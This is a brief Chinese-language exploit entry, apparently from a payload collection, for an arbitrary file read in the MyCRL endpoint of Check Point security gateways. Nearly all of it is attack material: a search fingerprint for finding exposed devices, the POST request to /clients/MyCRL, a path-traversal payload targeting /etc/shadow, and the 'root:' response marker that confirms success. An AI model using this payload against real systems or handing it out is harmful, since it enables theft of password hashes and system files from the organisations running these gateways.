# Check-Point安全网关MyCRL存在任意文件读取漏洞

Check ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="check point ssl network"`
- **请求**：`POST /clients/MyCRL HTTP/1.1`

**Payload**
```
aCSHELL/../../../../../../../etc/shadow
```
- **响应特征**：200 root: